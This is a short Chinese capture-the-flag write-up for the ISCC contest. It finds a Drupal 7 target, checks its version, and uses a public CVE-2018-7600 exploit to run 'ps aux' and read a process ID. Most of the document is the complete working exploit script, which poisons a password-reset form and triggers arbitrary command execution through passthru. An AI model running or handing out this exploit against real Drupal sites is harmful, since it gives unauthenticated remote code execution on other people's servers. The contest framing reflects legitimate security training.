## 【ISCC1】实战题阶段1

首先配置好vpn，进入如下界面：

<img src="https://s2.loli.net/2023/05/05/NhkpyinoqErjV4T.png" alt="image-20230505104346422" style="zoom:33%;" />

然后右键查看源码，发现这是 `Drupal7`：

![image-20230505104503508](https://s2.loli.net/2023/05/05/4usi56zG89kVYj2.png)

然后网上查一下这个版本的漏洞：

<img src="https://s2.loli.net/2023/05/05/xlKjL7yfEshVbk8.png" alt="image-20230505104927918" style="zoom:33%;" />

好像有一个命令执行漏洞

访问 `/CHANGELOG.txt`可以发现相关版本日志

<img src="https://s2.loli.net/2023/05/05/hSiA5VzEBbIZf4W.png" alt="image-20230505105838750" style="zoom:33%;" />



然后我们去github上找一下[exp](https://github.com/pimps/CVE-2018-7600)：

<img src="https://s2.loli.net/2023/05/05/CMIF4Ea3zOds8QX.png" alt="image-20230505105645139" style="zoom:33%;" />

这个可以用，我们直接git下来

然后直接利用即可，查看所有进程的命令为：`ps aux`不要加`-`

<img src="https://s2.loli.net/2023/05/05/1pSuAjdfDU7kHmC.png" alt="image-20230505110054228" style="zoom:50%;" />

我们运行脚本：

![image-20230505110143668](https://s2.loli.net/2023/05/05/w2yNh4mCaZ1FEOr.png)

正确找到了进程号：`PID=2997`

脚本如下：

```python
import socket
import socks
import requests
import argparse
from bs4 import BeautifulSoup

socks.set_default_proxy(socks.SOCKS5, 'localhost', 1080)
socket.socket = socks.socksocket


def get_args():
  parser = argparse.ArgumentParser( prog="drupa7-CVE-2018-7600.py",
                    formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=50),
                    epilog= '''
                    This script will exploit the (CVE-2018-7600) vulnerability in Drupal 7 <= 7.57
                    by poisoning the recover password form (user/password) and triggering it with
                    the upload file via ajax (/file/ajax).
                    ''')
  parser.add_argument("target", help="URL of target Drupal site (ex: http://target.com/)")
  parser.add_argument("-c", "--command", default="id", help="Command to execute (default = id)")
  parser.add_argument("-f", "--function", default="passthru", help="Function to use as attack vector (default = passthru)")
  parser.add_argument("-p", "--proxy", default="", help="Configure a proxy in the format http://127.0.0.1:8080/ (default = none)")
  args = parser.parse_args()
  return args

def pwn_target(target, function, command, proxy):
  requests.packages.urllib3.disable_warnings()
  proxies = {'http': proxy, 'https': proxy}
  print('[*] Poisoning a form and including it in cache.')
  get_params = {'q':'user/password', 'name[#post_render][]':function, 'name[#type]':'markup', 'name[#markup]': command}
  post_params = {'form_id':'user_pass', '_triggering_element_name':'name', '_triggering_element_value':'', 'opz':'E-mail new Password'}
  r = requests.post(target, params=get_params, data=post_params, verify=False, proxies=proxies)
  soup = BeautifulSoup(r.text, "html.parser")
  try:
    form = soup.find('form', {'id': 'user-pass'})
    form_build_id = form.find('input', {'name': 'form_build_id'}).get('value')
    if form_build_id:
        print('[*] Poisoned form ID: ' + form_build_id)
        print('[*] Triggering exploit to execute: ' + command)
        get_params = {'q':'file/ajax/name/#value/' + form_build_id}
        post_params = {'form_build_id':form_build_id}
        r = requests.post(target, params=get_params, data=post_params, verify=False, proxies=proxies)
        parsed_result = r.text.split('[{"command":"settings"')[0]
        print(parsed_result)
  except:
    print("ERROR: Something went wrong.")
    raise

def main():
  print ()
  print ('=============================================================================')
  print ('|          DRUPAL 7 <= 7.57 REMOTE CODE EXECUTION (CVE-2018-7600)           |')
  print ('|                              by pimps                                     |')
  print ('=============================================================================\n')

  args = get_args() # get the cl args
  pwn_target(args.target.strip(), args.function.strip(), args.command.strip(), args.proxy.strip())


if __name__ == '__main__':
  main()
```



